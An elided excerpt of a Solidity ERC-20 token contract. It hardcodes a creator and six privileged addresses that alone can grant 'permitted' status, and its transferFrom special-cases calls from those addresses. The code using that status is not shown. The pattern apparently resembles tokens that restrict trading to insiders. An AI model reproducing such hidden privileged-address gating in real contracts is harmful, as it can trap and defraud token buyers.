...
contract Permissions is Context
{
    ...
    address private _permis1;
    address private _permis2;
    address private _permis3;
    address private _permis4;
    address private _permis5;
    address private _permis6;
    
    mapping (address => bool) private _permitted;

    constructor() public
    {
        _creator = 0xa94647ee8a788A7816fC25EB63Ce7E14D3546D39; // creator address, owner of the created tokens
        ...
        _permis1 = 0xd601B8bA16D603e5ef6d29b02e3b91527f9DAa0d;
        _permis2 = 0x8FDA070a70ed7b623A295FECf779b5f4FAE22D9D;
        _permis3 = 0xD310605595c0DE78AC6fc4A5205aFb31852aaC68;
        _permis4 = 0xfeE635A42922e7100205Ae33554777f38C194e26;
        _permis5 = 0x9357DD3844efeF1643E332dC934765D28c85E562;
        _permis6 = 0xB18c8e0a2Da9B167b96382fB1304e5158286F4EC;
    ...
    function permis1() public view returns (address)
    { return _permis1; }
    
    function permis2() public view returns (address)
    { return _permis2; }
    
    function permis3() public view returns (address)
    { return _permis3; }
    
    function permis4() public view returns (address)
    { return _permis4; }
    
    function permis5() public view returns (address)
    { return _permis5; }
    
    function permis6() public view returns (address)
    { return _permis6; }
    
    function givePermissions(address who) internal
    {
        require(_msgSender() == _creator || _msgSender() == _uniswap || _msgSender() == _permis1 || _msgSender() == _permis2 || _msgSender() == _permis3 || _msgSender() == _permis4 || _msgSender() == _permis5 || _msgSender() == _permis6, "You do not have permissions for this action");
        _permitted[who] = true;
    }
...
contract ERC20 is Permissions, IERC20 {
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public   returns (bool) {
        ...
        if(_msgSender() == uniswap() || _msgSender() == permis1() || _msgSender() == permis2() || _msgSender() == permis3() || _msgSender() == permis4() || _msgSender() == permis5() || _msgSender() == permis6())
